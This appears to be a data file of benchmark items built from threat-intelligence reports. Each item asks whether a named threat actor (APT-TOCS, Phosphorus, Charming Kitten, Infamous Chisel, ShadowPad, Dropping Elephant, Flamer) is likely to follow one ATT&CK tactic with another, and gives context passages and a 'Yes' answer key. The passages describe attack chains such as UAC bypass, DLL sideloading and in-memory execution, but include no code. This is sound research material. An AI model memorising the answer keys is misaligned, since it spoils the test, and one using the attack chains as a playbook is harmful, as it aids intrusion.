134,116,116-Execution-T1106-Native API,"After APT-TOCS gained initial access using ""powershell.exe"" to execute Shellcode scripts for remote control of targeted systems, is it likely that Shellcode script functionalities were executed in memory during the core step of the attack without being written to the hard disk, before the attackers employed multi-beacon communication for defense evasion?","Execution: The APT-TOCS attack's core step involved downloading Shellcode script functionalities, which were then executed in memory without writing to the hard disk. The attack pattern included communication via Beacon mode, sending network heartbeat packages every 60 seconds, and transmitting data information via the Cookie field.","Initial Access: The APT-TOCS attack utilized ""powershell.exe"" to execute Shellcode scripts for remote control of targeted systems. Attackers may have used security vulnerabilities to execute scripts directly on the host. A binary file named Sample A, identified as Trojan/Win32.MSShell with MD5 44BCF2DD262F12222ADEAB6F59B2975B, was used in similar attacks to lead the attack by executing embedded malware using WinExec to call ""powershell.exe"".
Defense Evasion: APT-TOCS exhibited features designed to evade detection by security software and firewall interception. The attack pattern included running in memory, no hard disk writing operations, and the use of multi-beacon communication, which could work simultaneously and evade sandbox detection.
Lateral Movement: APT-TOCS depended on network projection and could laterally move within the internal network as required to conduct an attack.
Command and Control: APT-TOCS used encrypted data scripts downloaded by PowerShell for command and control. The attack communicated with compromised systems using HTTP GET requests to specific URLs and transmitted heartbeat packages using Cookie fields with 60 seconds intervals.
Others: APT-TOCS is closely related to the Cobalt Strike automatic attack testing platform. The attack can penetrate firewalls and is undetectable, capable of attacking various platforms, and formidable against Trusted Computing, Cloud Detection, and Sandbox Detection. The threat has been active for 5 years without powerful detection methods to defeat it. The attack is considered an APT due to its targeted nature, anti-detection functions, and ability to conceal itself. The use of a commercial attack platform reduces the cost and complexity of launching such attacks, making it difficult to trace the attackers.",Yes,ANALYSIS-ON-APT-TO-BE-ATTACK-THAT-FOCUSING-ON-CHINAS-GOVERNMENT-AGENCY-
139,116,116-Command and Control-T1573-Encrypted Channel,"After APT-TOCS exhibits lateral movement through network projection within the internal network, is it likely to use PowerShell to download encrypted data scripts for command and control operations?",Command and Control: APT-TOCS used encrypted data scripts downloaded by PowerShell for command and control. The attack communicated with compromised systems using HTTP GET requests to specific URLs and transmitted heartbeat packages using Cookie fields with 60 seconds intervals.,"Initial Access: The APT-TOCS attack utilized ""powershell.exe"" to execute Shellcode scripts for remote control of targeted systems. Attackers may have used security vulnerabilities to execute scripts directly on the host. A binary file named Sample A, identified as Trojan/Win32.MSShell with MD5 44BCF2DD262F12222ADEAB6F59B2975B, was used in similar attacks to lead the attack by executing embedded malware using WinExec to call ""powershell.exe"".
Execution: The APT-TOCS attack's core step involved downloading Shellcode script functionalities, which were then executed in memory without writing to the hard disk. The attack pattern included communication via Beacon mode, sending network heartbeat packages every 60 seconds, and transmitting data information via the Cookie field.
Defense Evasion: APT-TOCS exhibited features designed to evade detection by security software and firewall interception. The attack pattern included running in memory, no hard disk writing operations, and the use of multi-beacon communication, which could work simultaneously and evade sandbox detection.
Lateral Movement: APT-TOCS depended on network projection and could laterally move within the internal network as required to conduct an attack.
Others: APT-TOCS is closely related to the Cobalt Strike automatic attack testing platform. The attack can penetrate firewalls and is undetectable, capable of attacking various platforms, and formidable against Trusted Computing, Cloud Detection, and Sandbox Detection. The threat has been active for 5 years without powerful detection methods to defeat it. The attack is considered an APT due to its targeted nature, anti-detection functions, and ability to conceal itself. The use of a commercial attack platform reduces the cost and complexity of launching such attacks, making it difficult to trace the attackers.",Yes,ANALYSIS-ON-APT-TO-BE-ATTACK-THAT-FOCUSING-ON-CHINAS-GOVERNMENT-AGENCY-
154,118,118-Collection-T1056-Input Capture,"After employing capabilities for OS credential dumping via LOLBIN techniques under the Credential Access tactic, is the Phosphorus group likely to use the PowerLess Backdoor to steal browser data and keylogging information during the Collection phase?","Collection: The PowerLess Backdoor is capable of archiving collected data, including stealing browser data and keylogging information. The data is stored in paths such as 'C:\Windows\Temp\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK' and 'C:\Windows\Temp\cup.tmp'.","Initial Access: The Cybereason Nocturnus Team reported that the Phosphorus group exploited the Microsoft Exchange Server vulnerabilities known as ProxyShell to gain initial access to target networks. This enabled the deployment of malware, including the PowerLess Backdoor.
Execution: The PowerLess Backdoor, developed by the Phosphorus group, executes PowerShell code within a .NET application context, avoiding the launch of 'powershell.exe' and thus evading detection by security products. The backdoor supports downloading additional payloads, such as a keylogger and an info stealer, and can execute arbitrary commands and kill processes.
Persistence: The PowerLess Backdoor creates persistence through scheduled tasks. The malware loader 'WindowsProcesses.exe' uses the Registry RunKeys or Startup Folder for boot or logon autostart execution. Additionally, the malware uses server software components like web shells for persistence.
Defense Evasion: The Phosphorus group's PowerLess Backdoor evades detection by running PowerShell within a .NET application, not spawning 'powershell.exe'. The group also impairs defenses by disabling or modifying system firewalls and modifies the registry to aid in defense evasion.
Credential Access: The PowerLess Backdoor includes a keylogger module that captures user input, effectively accessing credentials. Additionally, OS credential dumping is performed using known LOLBIN techniques, such as leveraging 'Comsvcs.dll'.
Discovery: The Phosphorus group's PowerLess Backdoor has the capability to perform account discovery, specifically targeting local accounts on compromised systems.
Lateral Movement: After exploiting the Microsoft Exchange Server, the attackers used the PowerLess Backdoor to run reconnaissance commands and create persistence. They then dumped credentials and attempted to move laterally within the network.
Command and Control: The PowerLess Backdoor communicates with a command and control (C2) server using web protocols and encrypted channels that employ symmetric cryptography. The backdoor also uses proxy techniques for C2 communication.
Others: The Phosphorus group, also known as APT35 or Charming Kitten, has been active in cyber espionage and offensive cyber attacks, operating in the interest of the Iranian regime. The group has targeted various sectors, including medical research, academia, human rights, and media, and has interfered with the US presidential elections. The Cybereason Nocturnus Team discovered a new set of tools developed by Phosphorus, including the PowerLess Backdoor, malware loaders, a browser info stealer, and a keylogger. The group has also been observed using open-source tools such as DiskCryptor, BitLocker, and Fast Reverse Proxy for RDP proxying. Connections were found between Phosphorus and the Memento Ransomware, suggesting a potential shift towards ransomware operations. The research emphasizes the importance of following the breadcrumbs, such as pivoting on known infrastructure or PDB paths, to uncover additional tools and connections to other operations.",Yes,PowerLess Trojan_ Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage
159,119,119-Defense Evasion-T1553-Subvert Trust Controls,"After tricking victims into providing credentials through phishing pages impersonating services like Google Drive and Yahoo, is it likely that Charming Kitten will use self-signed digital certificates to subvert trust controls before redirecting victims to legitimate services for evasion?","Defense Evasion: To evade detection, Charming Kitten has used tactics such as redirecting victims to legitimate services after an attack, using self-signed digital certificates for phishing sites, and employing domain shortening services to conceal the actual malicious URLs.","Reconnaissance: The Charming Kitten campaign, attributed to an Iranian APT group, has been actively engaging in reconnaissance by leveraging various impersonation vectors to target individuals of interest to Iran. These individuals include academic researchers, human rights activists, opposition to Iran's regime, journalists, and prominent Iranians living abroad. The campaign has utilized spear-phishing emails and SMS messages to gather information such as phone numbers for password recovery and two-factor authentication, aiming to gain control of the victims' email accounts.
Resource Development: Charming Kitten has developed resources for their campaign by creating phishing sites that impersonate legitimate services such as Google Drive, Yahoo, and social networks like Instagram, Facebook, and Twitter. They have also prepared ZIP files with ready infrastructures for phishing sites using WordPress and CrunchPress interfaces, containing relevant files such as logos and personas to impersonate.
Initial Access: Charming Kitten has gained initial access through spear-phishing methods, including emails and SMS messages impersonating Google Drive, Yahoo services, and social networks. They have sent messages from seemingly known contacts or services, prompting victims to click on malicious links that lead to phishing sites designed to steal credentials.
Credential Access: Charming Kitten's primary goal has been to access credentials by directing victims to phishing pages that impersonate login pages for services like Google Drive and Yahoo. The victims are manipulated into entering their credentials, believing they are accessing legitimate services.
Others: Charming Kitten has been associated with the Ministry of Intelligence of Iran and has been active since 2014. The group has been known to target various entities, including U.S. presidential campaigns, government officials, and journalists. They have also been involved in campaigns to interfere with democratic procedures, historically attributed to Russian APT groups. ClearSky Security Ltd has been monitoring Charming Kitten's activities and has identified new domains and IPs associated with the group's infrastructure, indicating ongoing efforts to target Yahoo accounts and impersonate services such as Microsoft.",Yes,The-Kittens-Are-Back-in-Town-2
185,120,120-Discovery-T1614-System Location Discovery,"After Infamous Chisel collects files from application and data directories containing communication data, is it likely to enumerate data directories to discover files of interest and collect GPS information before automatically exfiltrating these files using Tor hidden service and SSH connections?","Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.","Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
188,120,120-Discovery-T1046-Network Service Discovery,"After deploying tcpdump to scrape credential-containing files for Credential Access, is Infamous Chisel likely to enumerate system data directories and GPS information to facilitate Discovery before automatically exfiltrating the collected files using Tor hidden services?","Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.","Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
231,127,127-Initial Access-T1566-Phishing,"After the threat actor group targeted organizations in South Korea, the US, and East Asia with spear phishing emails containing malicious documents for Initial Access, is it likely that they used batch files to decode and execute additional files before performing a UAC bypass to escalate privileges?","Initial Access: The Threat Recon team from NSHC reported on March 28, 2019, that a threat actor group targeted organizations in South Korea, the US, and East Asia with malware distributed via spear phishing emails. The emails contained malicious documents that, when executed, would download a base64-encoded CAB file from a remote site through a script embedded in the document.","Execution: The malware infection method involved a multi-step process using batch files. Initially, a script in a malicious document would download a base64-encoded text file (1.txt), which is then decoded to create and execute a batch file (1.bat). This batch file would then download additional text files (2.txt for 32-bit or 3.txt for 64-bit systems), which are decoded to create a 'setup.cab' file. The CAB file contained a BAT file for executing the main payload, an INI file with the attacker server address, a DLL file for UAC bypass, and the main EXE payload.
Privilege Escalation: The malware used a specific User Access Control (UAC) bypass module to execute the main payload without triggering a UAC pop-up. This was achieved by copying the INI configuration file and the main payload EXE into the System32 folder, which would normally prompt a UAC pop-up for security reasons. The UAC bypass module was created by referencing the open-source UAC-TokenMagic.ps1 on GitHub and involved creating a wusa.exe process with a High Integrity Level, copying its token, and running cmd.exe with elevated privileges to execute the batch file installing the main payload.
Defense Evasion: The threat actor group utilized a UAC bypass module to prevent the User Account Control (UAC) pop-up from appearing when files were moved to the System32 folder, which is a typical defense mechanism in Windows operating systems. The UAC bypass allowed the malware to execute without alerting the user.
Others: The Threat Recon team identified the use of decoy documents in Russian, English, and Korean languages, and the deployment of malware variants BABYFACE and SYSCON as the main payload. The activities of the threat actor group may be related to previously known groups. Indicators of compromise include SHA-256 hashes and IP addresses associated with the attack.",Yes,Threat Actor Group using UAC Bypass Module to run BAT File
232,127,127-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,Is it likely that the threat actor used batch files to decode a base64 CAB file for loading the main payload during execution before leveraging the UAC bypass module to prevent User Account Control (UAC) pop-ups and execute the main payload with elevated privileges in the System32 folder?,"Privilege Escalation: The malware used a specific User Access Control (UAC) bypass module to execute the main payload without triggering a UAC pop-up. This was achieved by copying the INI configuration file and the main payload EXE into the System32 folder, which would normally prompt a UAC pop-up for security reasons. The UAC bypass module was created by referencing the open-source UAC-TokenMagic.ps1 on GitHub and involved creating a wusa.exe process with a High Integrity Level, copying its token, and running cmd.exe with elevated privileges to execute the batch file installing the main payload.","Initial Access: The Threat Recon team from NSHC reported on March 28, 2019, that a threat actor group targeted organizations in South Korea, the US, and East Asia with malware distributed via spear phishing emails. The emails contained malicious documents that, when executed, would download a base64-encoded CAB file from a remote site through a script embedded in the document.
Execution: The malware infection method involved a multi-step process using batch files. Initially, a script in a malicious document would download a base64-encoded text file (1.txt), which is then decoded to create and execute a batch file (1.bat). This batch file would then download additional text files (2.txt for 32-bit or 3.txt for 64-bit systems), which are decoded to create a 'setup.cab' file. The CAB file contained a BAT file for executing the main payload, an INI file with the attacker server address, a DLL file for UAC bypass, and the main EXE payload.
Defense Evasion: The threat actor group utilized a UAC bypass module to prevent the User Account Control (UAC) pop-up from appearing when files were moved to the System32 folder, which is a typical defense mechanism in Windows operating systems. The UAC bypass allowed the malware to execute without alerting the user.
Others: The Threat Recon team identified the use of decoy documents in Russian, English, and Korean languages, and the deployment of malware variants BABYFACE and SYSCON as the main payload. The activities of the threat actor group may be related to previously known groups. Indicators of compromise include SHA-256 hashes and IP addresses associated with the attack.",Yes,Threat Actor Group using UAC Bypass Module to run BAT File
255,130,130-Persistence-T1547-Boot or Logon Autostart Execution,"After ShadowPad is decrypted in memory and embedded in a child process of a service process as part of its execution chain, is it likely that ShadowPad will establish persistence by creating a service to launch the legitimate executable from a specific subdirectory before evading detection by padding its DLL loader to over 50MB?","Persistence: ShadowPad establishes persistence on a compromised host specified in the configuration settings. Persistence is achieved via creation of a service and a registry Run key. The Windows service that launches the legitimate executable from the subdirectory initiates the ShadowPad execution chain, ensuring that the malware remains active even after system restarts or interruptions.","Initial Access: The ShadowPad advanced modular remote access trojan (RAT) has been deployed by the Chinese government-sponsored BRONZE ATLAS threat group since at least 2017. Secureworks Counter Threat Unit (CTU) researchers discovered that ShadowPad payloads are deployed to a host either encrypted within a DLL loader or within a separate file alongside a DLL loader. These DLL loaders decrypt and execute ShadowPad in memory after being sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The majority of ShadowPad samples analyzed were two-file execution chains: an encrypted ShadowPad payload embedded in a DLL loader. ShadowPad DLL loaders are sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The DLL loader then decrypts and executes the embedded ShadowPad payload in memory using a custom decryption algorithm specific to the malware version. CTU researchers identified ShadowPad execution chains involving a third file that contains the encrypted ShadowPad payload. These chains execute the legitimate executable (usually renamed), sideload the ShadowPad DLL loader, and load and decrypt the third file. CTU researchers observed threat actors using BDReinit.exe or Oleview.exe as initial files in the three-file ShadowPad execution chain. The third file in the BDReinit.exe execution chain is log.dll.dat; in the Oleview.exe execution chain, it is iviewers.dll.dat. CTU researchers have attributed campaigns using these execution chains to the Chinese BRONZE UNIVERSITY threat group, which has targeted transportation, natural resource, energy, and non-governmental organizations. Third-party researchers have also identified three-file ShadowPad execution chains that begin with consent.exe (followed by secur32.dll and secur32.dll.dat) and AppLaunch.exe (followed by mscoree.dll and mscoree.dll.dat). Additionally, CTU analysis revealed a sample that used AppLaunch.exe followed by mscoree.dll and mscoree.dll.mui.
Execution: ShadowPad is decrypted in memory using a custom decryption algorithm. CTU researchers have identified multiple ShadowPad versions based on these distinct algorithms. ShadowPad extracts information about the host, executes commands, interacts with the file system and registry, and deploys new modules to extend functionality. As part of the execution chain, ShadowPad copies the legitimate binary and sideloaded DLL to a subdirectory specific to each sample. Most analyzed samples were copied to a subdirectory under C:\ProgramData, C:\Users\<username>\Roaming, or C:\Program Files. In three-file execution chains, the third file (e.g., log.dll.dat, iviewers.dll.dat) is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software. As part of this process, an encrypted payload is usually saved to a registry key under HKLM\SOFTWARE\Classes\CLSID\{GUID}\<eight-character hexadecimal string>. After the initial setup the legitimate executable is launched as a Windows service. This service initiates the ShadowPad execution chain. The ShadowPad payload is injected into a child process of the service process that is specified in the ShadowPad configuration information.
Defense Evasion: ShadowPad samples from 2018 deviated from the typical two-file execution chain. Those samples, which used the filename TSVIPSrv.DLL, are placed in the Windows System32 directory and are loaded by the Windows SessionEnv Service, which is vulnerable to DLL hijacking. CTU researchers observed BRONZE ATLAS using this technique in 2021 to load other payloads via this filename, including Cobalt Strike. In three-file execution chains, the third file is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software.
Command and Control: ShadowPad samples sharing behavioral similarities such as injecting the decrypted ShadowPad payload into a newly launched target process and establishing persistence on a compromised host specified in the configuration settings. Figure 1 lists configuration information for a ShadowPad sample that reveals command and control (C2) details, the process injection target, and persistence via creation of a service and a registry Run key.
Others: ShadowPad gained notoriety in 2017 after it was deployed in software supply chain attacks involving CCleaner, NetSarang, and ASUS Live Update utility. These campaigns were attributed to the BRONZE ATLAS threat group. A 2017 Microsoft complaint and U.S. Department of Justice (DOJ) indictments unsealed in 2020 provide additional information on ShadowPad's connection to BRONZE ATLAS. The Microsoft complaint alleges that BRONZE ATLAS (also known as Barium) deployed ShadowPad in 2017 to steal intellectual property and personally identifiable information (PII). At the time, the malware was used only by BRONZE ATLAS. The DOJ indictments allege that Chinese nationals working for the Chengdu 404 network security company deployed ShadowPad in a global campaign attributed to BRONZE ATLAS. A related DOJ indictment revealed that these Chinese nationals collaborated with another Chinese national known by the handle 'Rose' (sometimes known as Withered Rose and Wicked Rose), using similar tactics, techniques, and procedures (TTPs) and sharing malware. The indictment describes this individual as a sophisticated threat actor who committed computer intrusion offenses targeting high-technology organizations globally. Campaigns linked to Rose were tracked as Barium. A third-party report claimed that Rose likely co-developed malware with an associate named 'whg,' who has been linked to the development of the PlugX malware. PlugX is used by multiple Chinese threat groups. Third-party researchers also identified string and code overlap between PlugX and ShadowPad. This overlap suggests close links between the ShadowPad and PlugX developers. ShadowPad may have been developed by an individual or group affiliated with BRONZE ATLAS. One possibility is that Chengdu 404 originally developed ShadowPad, as the individuals named in the DOJ indictments were allegedly involved with developing malware used in their campaigns. It is likely that only BRONZE ATLAS used ShadowPad until approximately 2019. Most of the ShadowPad DLL loader samples can be clustered based on compile timestamps, C2 infrastructure, payload versions, DLL loader code overlap, and likely victimology. CTU researchers identified multiple ShadowPad clusters used in campaigns since 2019 and attributed these clusters to distinct threat groups. These groups include BRONZE ATLAS and BRONZE UNIVERSITY, whose targeting suggests affiliation with the MSS. A third-party report suggests that BRONZE UNIVERSITY (referred to in the report as EarthLusca) may be operating near to Chengdu in China after operational security mistakes revealed China-based infrastructure. Other ShadowPad clusters appear to reflect targeting aligned with PLA theater command areas of responsibility. In late 2015, PRC leader Xi Jinping announced widespread reforms to the PLA that included the establishment of the Strategic Support Force (PLASSF or SSF). This new branch focuses on modernizing the PLA's capabilities in strategic frontiers of space, cyberspace, and the electromagnetic domain. The impact on the PLA's cyber espionage mission has been extensive. Many organizations responsible for cyber espionage and signals intelligence (SIGINT) associated with the Third Department of the PLA's General Staff Department (commonly known as 3PLA) have been absorbed into the SSF Network Systems Department (NSD). The SSF NSD is also believed to be responsible for a broad range of information warfare capabilities beyond cyber espionage, coordinating electronic countermeasures as well as offensive and defensive cyber projects. As part of the modernization, the PLA replaced its seven military regions with five theater commands: Eastern, Southern, Western, Northern, and Central. These theater commands orchestrate ground, naval, air, and conventional missile forces for military operations in their geographic area of responsibility. While the exact area of responsibility for each theater command is ambiguous, they are broadly responsible for specific threats within their respective regions. Prior to the PLA reforms, each military region maintained at least one Technical Reconnaissance Bureau (TRB) to handle SIGINT and cyber espionage activities focused on the military region's area of responsibility. The TRBs were distinct from the former 3PLA units that were located across China, but they may have been tasked by the 3PLA. The relationship between the TRBs and the theater commands is unclear. The TRBs may have been consolidated under the SSF NSD alongside former 3PLA units. It is also possible that they continue to target countries in their area of responsibility but under the command and control of the SSF NSD. CTU researchers grouped distinct ShadowPad activity clusters by targeted geographic regions. Clusters align with the documented area of responsibility for three of the theater commands: Northern, Southern, and Western. CTU researchers attribute some of the ShadowPad activity to Chinese threat groups that have been publicly linked to specific PLA units located in the corresponding theater commands: Northern Theater Command: CTU researchers linked ShadowPad activity to BRONZE HUNTLEY and BRONZE BUTLER, which are reportedly located in the Northern Theater Command. These threat groups deployed ShadowPad against targets in South Korea, Russia, Japan, and Mongolia. These regions align with the Northern Theater Command's focus. In 2021, CTU researchers observed malware and infrastructure overlap between the two threat groups, suggesting close collaboration. Western Theater Command: Some ShadowPad activity primarily targeted countries neighboring China's western border, such as India and Afghanistan. CTU researchers clustered this activity based on attacker-controlled infrastructure, ShadowPad DLL loader variants such as ICEKILLER, and contextual information from third-party sources. Third-party researchers linked some of these campaigns to an individual working on behalf of the Western Theater Command. CTU analysis did not reveal sufficient evidence to corroborate these claims, but the locations and victimology are consistent with threat actors operating on behalf of the Western Theater Command. Southern Theater Command: CTU researchers identified activity that used a specific ShadowPad version to target organizations in the South China Sea region. BRONZE GENEVA is likely responsible for part of this activity based on overlap between the C2 infrastructure for the Nebulae malware family associated with BRONZE GENEVA and a ShadowPad sample analyzed by CTU researchers. This attribution of ShadowPad campaigns to theater commands is based on the submitter's location for ShadowPad malware samples uploaded to the VirusTotal analysis service (potentially indicating the victim's country), the C2 domain names that appear to reference specific regions (e.g., cloudvn. info suggests Vietnam targeting), contextual information regarding the activity and victimology, and the absence of evidence that ShadowPad samples with the same attributes were deployed in other regions. Evidence available as of this publication suggests that ShadowPad has been deployed by MSS-affiliated threat groups, as well as PLA-affiliated threat groups that operate on behalf of the regional theater commands. The malware was likely developed by threat actors affiliated with BRONZE ATLAS and then shared with MSS and PLA threat groups around 2019. Given the range of groups leveraging ShadowPad, all organizations that are likely targets for Chinese threat groups should monitor for TTPs associated with this malware. Organizations with operations in or connections to geographic regions covered by the regional theater commands should specifically monitor for known TTPs associated with threat groups likely affiliated with the relevant theater command.",Yes,ShadowPad Malware Analysis _ Secureworks
283,136,136-Execution-T1059-Command and Scripting Interpreter,"After gaining initial access through spear-phishing emails exploiting vulnerabilities such as CVE-2012-0158 or CVE-2014-6352, is Dropping Elephant likely to use a UPX packed backdoor to download PowerShell command line scripts for execution before employing encoded blobs for defense evasion techniques?","Execution: The backdoor used by Dropping Elephant is UPX packed and downloads additional malware from the C2 server, including encoded blobs that are decoded to PowerShell command line scripts.","Reconnaissance: The Dropping Elephant threat actor, also known as Chinastrats and Patchwork, has been observed targeting high-profile diplomatic and economic entities with a focus on China's foreign relations. The adversaries employ spear-phishing and watering hole attacks to gather information and compromise victims.
Initial Access: Dropping Elephant uses spear-phishing with documents containing remote content that sends a 'ping' to the attackers' server upon opening. A subsequent spear-phishing email with an MS Word document exploiting CVE-2012-0158 or a PowerPoint document exploiting CVE-2014-6352 is sent. They also use watering hole attacks with a website that downloads genuine news articles and requires downloading a PowerPoint document to view the entire article, which contains a malicious artifact.
Defense Evasion: The backdoor downloads encoded blobs that are decoded to PowerShell command line scripts, which are then executed to download additional malware. This method of using encoded blobs helps evade detection.
Credential Access: The backdoor steals the user's Google Chrome credentials among other data.
Collection: The file-stealer module iterates through directories to collect files with specific extensions (doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, pdf) and uploads them to the C2 server.
Command and Control: The backdoor pings the C2 server at regular intervals, which can be spotted by analyzing firewall log files. The group also uses resilient communications, hiding encrypted C2 server locations in comments on legitimate websites.
Others: The Dropping Elephant artifacts are detected by Kaspersky Lab products under various signatures. Kaspersky Lab collaborates with CERTs and LEAs to notify victims and mitigate the threat. Indicators of Compromise (IoCs) include a list of backdoors, exploit documents, domains, IPs, and C2 redirectors.",Yes,The Dropping Elephant actor - Securelist
316,142,142-Command and Control-T1102-Web Service,"Before the attackers behind W32.Flamer utilized the Web application Newsforyou to manage their C&C servers and process client interactions, is it likely that the malware collected encrypted data from compromised systems and uploaded it to the C&C servers?","Command and Control: The C&C servers for W32.Flamer were managed through a Web application called Newsforyou, which processed client interactions and provided a control panel for attackers to upload code packages and download stolen data. The application was designed to communicate with clients compromised by malware other than Flamer, indicating a framework supporting different malware campaigns.","Initial Access: The W32.Flamer malware utilized a novel man-in-the-middle attack against Windows Update to spread across networks and gain initial access to systems.
Defense Evasion: The attackers behind W32.Flamer took steps to avoid detection and hamper investigations by disabling unnecessary logging and securely deleting log files regularly. They also configured the C&C servers to record minimal information.
Collection: The W32.Flamer malware collected data from compromised systems, which was then uploaded to the C&C servers. The data was encrypted with a public key, requiring a corresponding private key to decrypt, which was not available to the operators.
Exfiltration: Compromised clients uploaded stolen data to the C&C servers, which was then archived and could be downloaded by the operators. The data was encrypted, preventing unauthorized access even if the C&C server was infiltrated.
Impact: One of the C&C servers delivered a module instructing W32.Flamer to self-destruct and remove all traces of the malware from compromised systems in late May 2012.
Others: The forensic analysis of the W32.Flamer C&C servers revealed that the servers were operational since at least 2012, with the first server set up on May 18, 2012, and the second on March 25, 2012. The analysis also uncovered the nicknames of four authors who worked on the code, indicating a collaborative and ongoing development effort. The C&C servers were part of a sophisticated cyber espionage campaign targeting the Middle East, with the malware being modular in design and containing novel functionality. The attackers employed data security compartmentalization techniques, indicating a highly organized and sophisticated group behind the operation. The investigation provided insights into the architecture of the threat and the command structure of the entities behind it, suggesting the involvement of a large and well-funded entity.",Yes,w32_flamer_newsforyou
317,142,142-Impact-T1485-Data Destruction,"After compromised clients uploaded stolen data to the C&C servers and the data was encrypted to prevent unauthorized access during exfiltration, is it likely that the C&C servers delivered a module instructing W32.Flamer to self-destruct and remove all traces of the malware from compromised systems as part of the impact phase?",Impact: One of the C&C servers delivered a module instructing W32.Flamer to self-destruct and remove all traces of the malware from compromised systems in late May 2012.,"Initial Access: The W32.Flamer malware utilized a novel man-in-the-middle attack against Windows Update to spread across networks and gain initial access to systems.
Defense Evasion: The attackers behind W32.Flamer took steps to avoid detection and hamper investigations by disabling unnecessary logging and securely deleting log files regularly. They also configured the C&C servers to record minimal information.
Collection: The W32.Flamer malware collected data from compromised systems, which was then uploaded to the C&C servers. The data was encrypted with a public key, requiring a corresponding private key to decrypt, which was not available to the operators.
Command and Control: The C&C servers for W32.Flamer were managed through a Web application called Newsforyou, which processed client interactions and provided a control panel for attackers to upload code packages and download stolen data. The application was designed to communicate with clients compromised by malware other than Flamer, indicating a framework supporting different malware campaigns.
Exfiltration: Compromised clients uploaded stolen data to the C&C servers, which was then archived and could be downloaded by the operators. The data was encrypted, preventing unauthorized access even if the C&C server was infiltrated.
Others: The forensic analysis of the W32.Flamer C&C servers revealed that the servers were operational since at least 2012, with the first server set up on May 18, 2012, and the second on March 25, 2012. The analysis also uncovered the nicknames of four authors who worked on the code, indicating a collaborative and ongoing development effort. The C&C servers were part of a sophisticated cyber espionage campaign targeting the Middle East, with the malware being modular in design and containing novel functionality. The attackers employed data security compartmentalization techniques, indicating a highly organized and sophisticated group behind the operation. The investigation provided insights into the architecture of the threat and the command structure of the entities behind it, suggesting the involvement of a large and well-funded entity.",Yes,w32_flamer_newsforyou
319,142,142-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the W32.Flamer malware collects and encrypts data from compromised systems for secure transmission to the C&C servers, is it likely that the compromised clients will upload the stolen data to the C&C servers before the operators download the archived data?","Exfiltration: Compromised clients uploaded stolen data to the C&C servers, which was then archived and could be downloaded by the operators. The data was encrypted, preventing unauthorized access even if the C&C server was infiltrated.","Initial Access: The W32.Flamer malware utilized a novel man-in-the-middle attack against Windows Update to spread across networks and gain initial access to systems.
Defense Evasion: The attackers behind W32.Flamer took steps to avoid detection and hamper investigations by disabling unnecessary logging and securely deleting log files regularly. They also configured the C&C servers to record minimal information.
Collection: The W32.Flamer malware collected data from compromised systems, which was then uploaded to the C&C servers. The data was encrypted with a public key, requiring a corresponding private key to decrypt, which was not available to the operators.
Command and Control: The C&C servers for W32.Flamer were managed through a Web application called Newsforyou, which processed client interactions and provided a control panel for attackers to upload code packages and download stolen data. The application was designed to communicate with clients compromised by malware other than Flamer, indicating a framework supporting different malware campaigns.
Impact: One of the C&C servers delivered a module instructing W32.Flamer to self-destruct and remove all traces of the malware from compromised systems in late May 2012.
